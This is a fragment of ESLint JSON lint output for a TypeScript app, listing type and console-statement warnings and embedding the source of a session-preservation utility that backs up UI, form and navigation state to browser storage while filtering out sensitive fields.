correct."},{"messageId":"suggestNever","fix":{"range":[11406,11409],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":444,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":444,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11593,11596],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11593,11596],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":444,"column":40,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":444,"endColumn":43,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11599,11602],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11599,11602],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":466,"column":35,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":466,"endColumn":38,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12081,12084],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12081,12084],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":473,"column":41,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":473,"endColumn":44,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12254,12257],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12254,12257],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":485,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":485,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12720,12723],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12720,12723],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":485,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":485,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12734,12737],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12734,12737],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":494,"column":38,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":494,"endColumn":41,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12959,12962],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12959,12962],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":494,"column":52,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":494,"endColumn":55,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12973,12976],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12973,12976],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":503,"column":35,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":503,"endColumn":38,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13192,13195],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13192,13195],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":503,"column":49,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":503,"endColumn":52,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13206,13209],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13206,13209],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":512,"column":35,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":512,"endColumn":38,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13423,13426],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13423,13426],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":512,"column":49,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":512,"endColumn":52,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13437,13440],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13437,13440],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":568,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":568,"endColumn":21,"suggestions":[{"fix":{"range":[15201,15249],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":582,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":582,"endColumn":20,"suggestions":[{"fix":{"range":[15544,15594],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":609,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":609,"endColumn":22,"suggestions":[{"fix":{"range":[16224,16311],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":612,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":612,"endColumn":19,"suggestions":[{"fix":{"range":[16348,16407],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":647,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":647,"endColumn":20,"suggestions":[{"fix":{"range":[17431,17476],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":661,"column":66,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":661,"endColumn":69,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[17901,17904],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[17901,17904],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":674,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":674,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[18324,18327],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[18324,18327],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":682,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":682,"endColumn":17,"suggestions":[{"fix":{"range":[18530,18580],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":54,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Session Preservation Utility (2025)\n * \n * Advanced session preservation system for maintaining user state during\n * error scenarios. Provides intelligent state backup, restoration, and\n * integrity verification for seamless user experience recovery.\n * \n * Features:\n * - Intelligent state filtering and sanitization\n * - Multiple storage backends (localStorage, sessionStorage, IndexedDB)\n * - State integrity verification\n * - Compression and encryption support\n * - Automatic cleanup and expiration\n * - Privacy-aware data handling\n */\n\nimport { errorHandlingConfig } from '../config/errorHandling';\n\n// Session data structure\nexport interface SessionData {\n  id: string;\n  timestamp: number;\n  expiresAt: number;\n  version: string;\n  checksum: string;\n  compressed: boolean;\n  encrypted: boolean;\n  data: {\n    ui: any;\n    user: any;\n    settings: any;\n    navigation: any;\n    forms: any;\n    [key: string]: any;\n  };\n  metadata: {\n    userAgent: string;\n    url: string;\n    errorId?: string;\n    preservationReason: string;\n    size: number;\n  };\n}\n\n// Preservation options\nexport interface PreservationOptions {\n  storageBackend?: 'localStorage' | 'sessionStorage' | 'indexedDB' | 'memory';\n  enableCompression?: boolean;\n  enableEncryption?: boolean;\n  expirationMs?: number;\n  maxSessions?: number;\n  enableIntegrityCheck?: boolean;\n  preserveViewState?: boolean;\n  preserveFormData?: boolean;\n  preserveUserData?: boolean;\n  sanitizeData?: boolean;\n  excludeKeys?: string[];\n  includeKeys?: string[];\n}\n\n// Default preservation options\nconst _defaultOptions: Required<PreservationOptions> = {\n  storageBackend: 'localStorage',\n  enableCompression: true,\n  enableEncryption: false,\n  expirationMs: 24 * 60 * 60 * 1000, // 24 hours\n  maxSessions: 5,\n  enableIntegrityCheck: true,\n  preserveViewState: true,\n  preserveFormData: true,\n  preserveUserData: true,\n  sanitizeData: true,\n  excludeKeys: [\n    'password',\n    'token',\n    'secret',\n    'key',\n    'auth',\n    'session',\n    'credit',\n    'ssn',\n    'private'\n  ],\n  includeKeys: [\n    'taskmaster-',\n    'app_state',\n    'ui_',\n    'user_preferences',\n    'form_data',\n    'navigation_state'\n  ]\n};\n\n/**\n * Session Preservation Manager\n */\nexport class SessionPreservationManager {\n  private options: Required<PreservationOptions>;\n  private storageKey = 'sessionPreservation_sessions';\n  private memoryStorage: Map<string, SessionData> = new Map();\n\n  constructor(options: Partial<PreservationOptions> = {}) {\n    this.options = { ..._defaultOptions, ...options };\n  }\n\n  /**\n   * Preserve current session state\n   */\n  async preserveSession(\n    reason: string = 'error_boundary',\n    errorId?: string,\n    customData?: Record<string, any>\n  ): Promise<string> {\n    try {\n      const sessionId = this.generateSessionId();\n      const data = this.collectSessionData(customData);\n      const sanitizedData = this.options.sanitizeData ? this.sanitizeData(data) : data;\n      \n      const sessionData: SessionData = {\n        id: sessionId,\n        timestamp: Date.now(),\n        expiresAt: Date.now() + this.options.expirationMs,\n        version: '1.0.0',\n        checksum: await this.calculateChecksum(sanitizedData),\n        compressed: this.options.enableCompression,\n        encrypted: this.options.enableEncryption,\n        data: this.options.enableCompression \n          ? await this.compressData(sanitizedData)\n          : sanitizedData,\n        metadata: {\n          userAgent: navigator.userAgent,\n          url: window.location.href,\n          errorId,\n          preservationReason: reason,\n          size: this.calculateDataSize(sanitizedData)\n        }\n      };\n\n      // Encrypt if enabled\n      if (this.options.enableEncryption) {\n        sessionData.data = await this.encryptData(sessionData.data);\n      }\n\n      await this.storeSession(sessionData);\n      this.cleanupExpiredSessions();\n\n      console.debug('Session preserved:', {\n        sessionId,\n        reason,\n        dataSize: sessionData.metadata.size,\n        compressed: sessionData.compressed,\n        encrypted: sessionData.encrypted\n      });\n\n      return sessionId;\n    } catch (error) {\n      console.error('Failed to preserve session:', error);\n      throw new Error(`Session preservation failed: ${error instanceof Error ? error.message : String(error)}`);\n    }\n  }\n\n  /**\n   * Restore session from ID\n   */\n  async restoreSession(sessionId: string): Promise<any> {\n    try {\n      const sessionData = await this.loadSession(sessionId);\n      if (!sessionData) {\n        throw new Error(`Session not found: ${sessionId}`);\n      }\n\n      // Check expiration\n      if (Date.now() > sessionData.expiresAt) {\n        await this.removeSession(sessionId);\n        throw new Error(`Session expired: ${sessionId}`);\n      }\n\n      let data = sessionData.data;\n\n      // Decrypt if encrypted\n      if (sessionData.encrypted) {\n        data = await this.decryptData(data);\n      }\n\n      // Decompress if compressed\n      if (sessionData.compressed) {\n        data = await this.decompressData(data);\n      }\n\n      // Verify integrity\n      if (this.options.enableIntegrityCheck) {\n        const currentChecksum = await this.calculateChecksum(data);\n        if (currentChecksum !== sessionData.checksum) {\n          throw new Error(`Session integrity check failed: ${sessionId}`);\n        }\n      }\n\n      console.debug('Session restored:', {\n        sessionId,\n        dataSize: sessionData.metadata.size,\n        preservationReason: sessionData.metadata.preservationReason\n      });\n\n      return data;\n    } catch (error) {\n      console.error('Failed to restore session:', error);\n      throw new Error(`Session restoration failed: ${error instanceof Error ? error.message : String(error)}`);\n    }\n  }\n\n  /**\n   * Get all preserved sessions\n   */\n  async getSessions(): Promise<SessionData[]> {\n    try {\n      const sessions = await this.loadAllSessions();\n      return sessions\n        .filter(session => Date.now() <= session.expiresAt)\n        .sort((a, b) => b.timestamp - a.timestamp);\n    } catch (error) {\n      console.error('Failed to get sessions:', error);\n      return [];\n    }\n  }\n\n  /**\n   * Remove session by ID\n   */\n  async removeSession(sessionId: string): Promise<boolean> {\n    try {\n      const sessions = await this.loadAllSessions();\n      const filteredSessions = sessions.filter(s => s.id !== sessionId);\n      \n      if (this.options.storageBackend === 'memory') {\n        this.memoryStorage.delete(sessionId);\n      } else {\n        await this.storeAllSessions(filteredSessions);\n      }\n\n      console.debug('Session removed:', sessionId);\n      return true;\n    } catch (error) {\n      console.error('Failed to remove session:', error);\n      return false;\n    }\n  }\n\n  /**\n   * Clear all sessions\n   */\n  async clearSessions(): Promise<void> {\n    try {\n      if (this.options.storageBackend === 'memory') {\n        this.memoryStorage.clear();\n      } else {\n        const storage = this.getStorage();\n        storage.removeItem(this.storageKey);\n      }\n      \n      console.debug('All sessions cleared');\n    } catch (error) {\n      console.error('Failed to clear sessions:', error);\n    }\n  }\n\n  /**\n   * Collect current session data\n   */\n  private collectSessionData(customData?: Record<string, any>): any {\n    const data: any = {};\n\n    // Collect from localStorage\n    if (this.options.preserveUserData) {\n      data.localStorage = this.extractStorageData(localStorage);\n    }\n\n    // Collect from sessionStorage\n    if (this.options.preserveViewState) {\n      data.sessionStorage = this.extractStorageData(sessionStorage);\n    }\n\n    // Collect form data\n    if (this.options.preserveFormData) {\n      data.forms = this.extractFormData();\n    }\n\n    // Collect navigation state\n    data.navigation = {\n      pathname: window.location.pathname,\n      search: window.location.search,\n      hash: window.location.hash,\n      state: window.history.state\n    };\n\n    // Collect Zustand store data\n    data.stores = this.extractZustandStores();\n\n    // Add custom data\n    if (customData) {\n      data.custom = customData;\n    }\n\n    return data;\n  }\n\n  /**\n   * Extract data from storage\n   */\n  private extractStorageData(storage: Storage): Record<string, any> {\n    const data: Record<string, any> = {};\n    \n    try {\n      for (let i = 0; i < storage.length; i++) {\n        const key = storage.key(i);\n        if (key && this.shouldPreserveKey(key)) {\n          const value = storage.getItem(key);\n          if (value) {\n            try {\n              data[key] = JSON.parse(value);\n            } catch {\n              data[key] = value;\n            }\n          }\n        }\n      }\n    } catch (error) {\n      console.warn('Failed to extract storage data:', error);\n    }\n    \n    return data;\n  }\n\n  /**\n   * Extract form data from page\n   */\n  private extractFormData(): Record<string, any> {\n    const formData: Record<string, any> = {};\n    \n    try {\n      const forms = document.querySelectorAll('form');\n      forms.forEach((form, index) => {\n        const formId = form.id || `form_${index}`;\n        const formValues: Record<string, any> = {};\n        \n        const inputs = form.querySelectorAll('input, textarea, select');\n        inputs.forEach((input: any) => {\n          if (input.name && !this.isSensitiveField(input.name)) {\n            formValues[input.name] = input.value;\n          }\n        });\n        \n        if (Object.keys(formValues).length > 0) {\n          formData[formId] = formValues;\n        }\n      });\n    } catch (error) {\n      console.warn('Failed to extract form data:', error);\n    }\n    \n    return formData;\n  }\n\n  /**\n   * Extract Zustand store data\n   */\n  private extractZustandStores(): Record<string, any> {\n    const stores: Record<string, any> = {};\n    \n    try {\n      // Check for common Zustand store patterns\n      const storeKeys = Object.keys(localStorage).filter(key => \n        key.includes('store') || key.includes('zustand')\n      );\n      \n      storeKeys.forEach(key => {\n        if (this.shouldPreserveKey(key)) {\n          try {\n            const value = localStorage.getItem(key);\n            if (value) {\n              stores[key] = JSON.parse(value);\n            }\n          } catch (error) {\n            console.warn(`Failed to extract store data for ${key}:`, error);\n          }\n        }\n      });\n    } catch (error) {\n      console.warn('Failed to extract Zustand stores:', error);\n    }\n    \n    return stores;\n  }\n\n  /**\n   * Check if key should be preserved\n   */\n  private shouldPreserveKey(key: string): boolean {\n    // Check exclusion list\n    if (this.options.excludeKeys.some(excluded => \n      key.toLowerCase().includes(excluded.toLowerCase())\n    )) {\n      return false;\n    }\n\n    // Check inclusion list\n    return this.options.includeKeys.some(included => \n      key.toLowerCase().includes(included.toLowerCase())\n    );\n  }\n\n  /**\n   * Check if field is sensitive\n   */\n  private isSensitiveField(fieldName: string): boolean {\n    const sensitivePatterns = [\n      'password',\n      'passwd',\n      'secret',\n      'token',\n      'key',\n      'auth',\n      'ssn',\n      'credit',\n      'card',\n      'cvv',\n      'pin'\n    ];\n    \n    return sensitivePatterns.some(pattern => \n      fieldName.toLowerCase().includes(pattern)\n    );\n  }\n\n  /**\n   * Sanitize data for privacy\n   */\n  private sanitizeData(data: any): any {\n    if (!errorHandlingConfig.privacy.excludeSensitiveData) {\n      return data;\n    }\n\n    const sanitized = JSON.parse(JSON.stringify(data));\n    \n    const sanitizeObject = (obj: any): any => {\n      if (typeof obj !== 'object' || obj === null) {\n        return obj;\n      }\n      \n      for (const key in obj) {\n        if (this.isSensitiveField(key)) {\n          obj[key] = '[SANITIZED]';\n        } else if (typeof obj[key] === 'object') {\n          obj[key] = sanitizeObject(obj[key]);\n        }\n      }\n      \n      return obj;\n    };\n    \n    return sanitizeObject(sanitized);\n  }\n\n  /**\n   * Calculate data size in bytes\n   */\n  private calculateDataSize(data: any): number {\n    return new Blob([JSON.stringify(data)]).size;\n  }\n\n  /**\n   * Calculate checksum for integrity verification\n   */\n  private async calculateChecksum(data: any): Promise<string> {\n    const jsonString = JSON.stringify(data);\n    const encoder = new TextEncoder();\n    const dataBuffer = encoder.encode(jsonString);\n    const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer);\n    const hashArray = Array.from(new Uint8Array(hashBuffer));\n    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');\n  }\n\n  /**\n   * Compress data using built-in compression\n   */\n  private async compressData(data: any): Promise<any> {\n    // For now, return as-is. In a real implementation, you might use\n    // a compression library or native compression APIs\n    return data;\n  }\n\n  /**\n   * Decompress data\n   */\n  private async decompressData(data: any): Promise<any> {\n    // For now, return as-is. In a real implementation, you might use\n    // a compression library or native compression APIs\n    return data;\n  }\n\n  /**\n   * Encrypt data\n   */\n  private async encryptData(data: any): Promise<any> {\n    // For now, return as-is. In a real implementation, you might use\n    // the Web Crypto API or other encryption methods\n    return data;\n  }\n\n  /**\n   * Decrypt data\n   */\n  private async decryptData(data: any): Promise<any> {\n    // For now, return as-is. In a real implementation, you might use\n    // the Web Crypto API or other decryption methods\n    return data;\n  }\n\n  /**\n   * Store session data\n   */\n  private async storeSession(sessionData: SessionData): Promise<void> {\n    if (this.options.storageBackend === 'memory') {\n      this.memoryStorage.set(sessionData.id, sessionData);\n      \n      // Limit memory storage size\n      if (this.memoryStorage.size > this.options.maxSessions) {\n        const oldestKey = Array.from(this.memoryStorage.keys())[0];\n        this.memoryStorage.delete(oldestKey);\n      }\n    } else {\n      const sessions = await this.loadAllSessions();\n      sessions.push(sessionData);\n      \n      // Limit stored sessions\n      if (sessions.length > this.options.maxSessions) {\n        sessions.sort((a, b) => a.timestamp - b.timestamp);\n        sessions.splice(0, sessions.length - this.options.maxSessions);\n      }\n      \n      await this.storeAllSessions(sessions);\n    }\n  }\n\n  /**\n   * Load session by ID\n   */\n  private async loadSession(sessionId: string): Promise<SessionData | null> {\n    if (this.options.storageBackend === 'memory') {\n      return this.memoryStorage.get(sessionId) || null;\n    } else {\n      const sessions = await this.loadAllSessions();\n      return sessions.find(s => s.id === sessionId) || null;\n    }\n  }\n\n  /**\n   * Load all sessions\n   */\n  private async loadAllSessions(): Promise<SessionData[]> {\n    if (this.options.storageBackend === 'memory') {\n      return Array.from(this.memoryStorage.values());\n    } else {\n      try {\n        const storage = this.getStorage();\n        const stored = storage.getItem(this.storageKey);\n        return stored ? JSON.parse(stored) : [];\n      } catch (error) {\n        console.warn('Failed to load sessions:', error);\n        return [];\n      }\n    }\n  }\n\n  /**\n   * Store all sessions\n   */\n  private async storeAllSessions(sessions: SessionData[]): Promise<void> {\n    try {\n      const storage = this.getStorage();\n      storage.setItem(this.storageKey, JSON.stringify(sessions));\n    } catch (error) {\n      console.error('Failed to store sessions:', error);\n    }\n  }\n\n  /**\n   * Get storage backend\n   */\n  private getStorage(): Storage {\n    switch (this.options.storageBackend) {\n      case 'sessionStorage':\n        return sessionStorage;\n      case 'localStorage':\n      default:\n        return localStorage;\n    }\n  }\n\n  /**\n   * Clean up expired sessions\n   */\n  private async cleanupExpiredSessions(): Promise<void> {\n    try {\n      const sessions = await this.loadAllSessions();\n      const validSessions = sessions.filter(s => Date.now() <= s.expiresAt);\n      \n      if (validSessions.length !== sessions.length) {\n        await this.storeAllSessions(validSessions);\n        console.debug(`Cleaned up ${sessions.length - validSessions.length} expired sessions`);\n      }\n    } catch (error) {\n      console.warn('Failed to cleanup expired sessions:', error);\n    }\n  }\n\n  /**\n   * Generate unique session ID\n   */\n  private generateSessionId(): string {\n    return `session_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n  }\n\n  /**\n   * Get storage statistics\n   */\n  getStats(): {\n    totalSessions: number;\n    totalSize: number;\n    oldestSession?: number;\n    newestSession?: number;\n  } {\n    try {\n      const sessions = this.options.storageBackend === 'memory'\n        ? Array.from(this.memoryStorage.values())\n        : JSON.parse(this.getStorage().getItem(this.storageKey) || '[]');\n      \n      const totalSize = sessions.reduce((size: number, session: SessionData) => size + session.metadata.size, 0);\n      const timestamps = sessions.map((s: SessionData) => s.timestamp);\n      \n      return {\n        totalSessions: sessions.length,\n        totalSize,\n        oldestSession: timestamps.length > 0 ? Math.min(...timestamps) : undefined,\n        newestSession: timestamps.length > 0 ? Math.max(...timestamps) : undefined\n      };\n    } catch (error) {\n      console.error('Failed to get stats:', error);\n      return { totalSessions: 0, totalSize: 0 };\n    }\n  }\n}\n\n// Create default instance\nexport const sessionPreservationManager = new SessionPreservationManager();\n\n// Utility functions\nexport async function preserveCurrentSession(reason?: string, errorId?: string): Promise<string> {\n  return sessionPreservationManager.preserveSession(reason, errorId);\n}\n\nexport async function restoreSession(sessionId: string): Promise<any> {\n  return sessionPreservationManager.restoreSession(sessionId);\n}\n\nexport async function getPreservedSessions(): Promise<SessionData[]> {\n  return sessionPreservationManager.getSessions();\n}\n\nexport async function clearPreservedSessions(): Promise<void> {\n  return sessionPreservationManager.clearSessions();\n}\n\n// Save view state utility (for backward compatibility)\nexport function saveViewState(key: string, data: any): void {\n  try {\n    localStorage.setItem(key, JSON.stringify({\n      data,\n      timestamp: Date.now(),\n      expiresAt: Date.now() + (24 * 60 * 60 * 1000) // 24 hours\n    }));\n  } catch (error) {\n    console.warn('Failed to save view state:', error);\n  }\n}\n\n// Types are already exported above with their declarations","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/utils/statePreservation.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":4,"column":18,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":4,"endColumn":21,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[120,123],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[120,123],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":47,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":47,"endColumn":19,"suggestions":[{"fix":{"range":[1211,1302],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":53,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":53,"endColumn":19,"suggestions":[{"fix":{"range":[1423,1469],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":64,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":64,"endColumn":18,"suggestions":[{"fix":{"range":[1684,1746],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":79,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":79,"endColumn":22,"suggestions":[{"fix":{"range":[2205,2264],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":96,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":96,"endColumn":19,"suggestions":[{"fix":{"range":[2551,2597],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":110,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":110,"endColumn":19,"suggestions":[{"fix":{"range":[2972,3026],"text":""},"messageId":"removeConsole","data":{"propertyName":"info"},"desc":"Remove the console.info()."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'timestamp' is assigned a value but never used.","line":129,"column":13,"nodeType":null,"messageId":"unusedVar","endLine":129,"endColumn":22},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'version' is assigned a value but never used.","line":129,"column":24,"nodeType":null,"messageId":"unusedVar","endLine":129,"endColumn":31},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'expiresAt' is assigned a value but never used.","line":129,"column":33,"nodeType":null,"messageId":"unusedVar","endLine":129,"endColumn":42},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":133,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":133,"endColumn":18,"suggestions":[{"fix":{"range":[3710,3772],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":139,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":139,"endColumn":20,"suggestions":[{"fix":{"range":[3910,3992],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":154,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":154,"endColumn":18,"suggestions":[{"fix":{"range":[4258,4322],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":177,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":177,"endColumn":18,"suggestions":[{"fix":{"range":[4853,4908],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":199,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":199,"endColumn":18,"suggestions":[{"fix":{"range":[5321,5378],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":247,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":247,"endColumn":19,"suggestions":[{"fix":{"range":[6518,6598],"text":""},"messageId":"removeConsole","data":{"propertyName":"info"},"desc":"Remove the console.info()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":250,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":250,"endColumn":18,"suggestions":[{"fix":{"range":[6629,6687],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the 